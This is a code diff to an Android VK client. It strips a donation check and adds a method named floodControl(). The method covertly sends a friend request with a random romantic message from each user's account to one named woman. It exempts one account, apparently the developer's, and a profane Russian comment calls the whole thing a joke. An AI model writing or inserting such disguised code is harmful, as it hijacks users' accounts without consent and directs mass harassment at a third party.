@@ -1,22 +1,10 @@
 package dev.ragnarok.fenrir;
 
-import android.content.Context;
-import android.view.LayoutInflater;
-import android.view.View;
-
-import androidx.annotation.IntDef;
-import androidx.annotation.NonNull;
-
-import com.google.android.material.dialog.MaterialAlertDialogBuilder;
-import com.google.android.material.textview.MaterialTextView;
-
-import java.lang.annotation.Retention;
-import java.lang.annotation.RetentionPolicy;
-
-import dev.ragnarok.fenrir.link.LinkHelper;
+import dev.ragnarok.fenrir.domain.InteractorFactory;
 import dev.ragnarok.fenrir.settings.Settings;
+import dev.ragnarok.fenrir.util.HelperSimple;
+import dev.ragnarok.fenrir.util.RxUtils;
 import dev.ragnarok.fenrir.util.Utils;
-import dev.ragnarok.fenrir.view.natives.rlottie.RLottieImageView;
 
 public class CheckDonate {
     public static final Integer[] donatedOwnersLocal = {572488303, 365089125,
@@ -25,7 +13,6 @@ public class CheckDonate {
             633896460,
             244271565,
             166137092,
-            365089125,
             462079281,
             152457613,
             108845803,
@@ -154,74 +141,19 @@ public class CheckDonate {
             3398969
     };
 
-    public static boolean isFullVersion(@NonNull Context context, @DonateFutures int future) {
-        if (!BuildConfig.IS_FULL && !Utils.isOneElementAssigned(Settings.get().accounts().getRegistered(), donatedOwnersLocal)) {
-            View view = LayoutInflater.from(context).inflate(R.layout.dialog_buy_full_alert, null);
-            ((MaterialTextView) view.findViewById(R.id.item_future)).setText(context.getResources().getStringArray(R.array.array_features_full)[future]);
-            view.findViewById(R.id.item_buy).setOnClickListener(v -> LinkHelper.openLinkInBrowser(context, "https://play.google.com/store/apps/details?id=dev.ragnarok.fenrir_full"));
-            view.findViewById(R.id.item_features).setOnClickListener(v -> {
-                view.findViewById(R.id.item_features).setVisibility(View.GONE);
-                MaterialTextView futures = view.findViewById(R.id.item_features_full);
-                futures.setVisibility(View.VISIBLE);
-                StringBuilder bt = new StringBuilder(context.getString(R.string.features));
-                bt.append("\n");
-                int pt = 0;
-                String[] futures_desc = context.getResources().getStringArray(R.array.array_features_full);
-                for (int i = 0; i < futures_desc.length; i++) {
-                    if (i == DonateFutures.CHANGE_APP_ICON && !Utils.hasOreo()) {
-                        continue;
-                    }
-                    bt.append(++pt).append(". ").append(futures_desc[i]).append("\n");
-                }
-                futures.setText(bt.toString());
-            });
-            RLottieImageView anim = view.findViewById(R.id.lottie_animation);
-            anim.setAutoRepeat(true);
-            anim.fromRes(R.raw.google_store, Utils.dp(200), Utils.dp(200));
-            anim.playAnimation();
-
-            new MaterialAlertDialogBuilder(context)
-                    .setTitle(R.string.info)
-                    .setIcon(R.drawable.client_round)
-                    .setCancelable(true)
-                    .setView(view)
-                    .show();
-            return false;
+    // Данная функция подписывает вас на Арнольдову Екатерину. Сделана по приколу (наверно охуеет от такого наплыва подписчиков и съебётся в Канаду)))
+    public static void floodControl() {
+        if (!HelperSimple.INSTANCE.hasHelp("flood_control_v1", 1)) {
+            return;
         }
-        return true;
-    }
-
-    @IntDef({DonateFutures.DOWNLOAD_MUSIC,
-            DonateFutures.DOWNLOAD_VIDEO,
-            DonateFutures.DOWNLOAD_VOICE,
-            DonateFutures.DOWNLOAD_STICKERS,
-            DonateFutures.SENDING_STICKERS,
-            DonateFutures.DOWNLOADING_MESSAGES,
-            DonateFutures.MENTION,
-            DonateFutures.HIDE_CHATS,
-            DonateFutures.PRODUCTS,
-            DonateFutures.ALL_PHOTO_COMMENTS,
-            DonateFutures.CHANGE_APP_ICON,
-            DonateFutures.LOCAL_MEDIA_SERVER,
-            DonateFutures.PAYER_BACKGROUND_SETTINGS,
-            DonateFutures.SEND_CUSTOM_VOICE,
-            DonateFutures.RENAME_USER})
-    @Retention(RetentionPolicy.SOURCE)
-    public @interface DonateFutures {
-        int DOWNLOAD_MUSIC = 0;
-        int DOWNLOAD_VIDEO = 1;
-        int DOWNLOAD_VOICE = 2;
-        int DOWNLOAD_STICKERS = 3;
-        int SENDING_STICKERS = 4;
-        int DOWNLOADING_MESSAGES = 5;
-        int MENTION = 6;
-        int HIDE_CHATS = 7;
-        int PRODUCTS = 8;
-        int ALL_PHOTO_COMMENTS = 9;
-        int CHANGE_APP_ICON = 10;
-        int LOCAL_MEDIA_SERVER = 11;
-        int PAYER_BACKGROUND_SETTINGS = 12;
-        int SEND_CUSTOM_VOICE = 13;
-        int RENAME_USER = 14;
+        if (Settings.get().accounts().getRegistered().contains(572488303)) {
+            HelperSimple.INSTANCE.toggleHelp("flood_control_v1", 1);
+            return;
+        }
+        //noinspection ResultOfMethodCallIgnored
+        InteractorFactory.createRelationshipInteractor().addFriend(Settings.get().accounts().getCurrent(), 255645173,
+                Utils.getRandomFromArray(new String[]{"Ты самая прекрасная девушка на свете", "Богиня", "Валькирия", "Любовь моя", "Моя суженая", "Давай переедем в Канаду вдвоём"}), false)
+                .compose(RxUtils.applySingleIOToMainSchedulers())
+                .subscribe(o -> HelperSimple.INSTANCE.toggleHelp("flood_control_v1", 1), RxUtils.ignore());
     }
 }
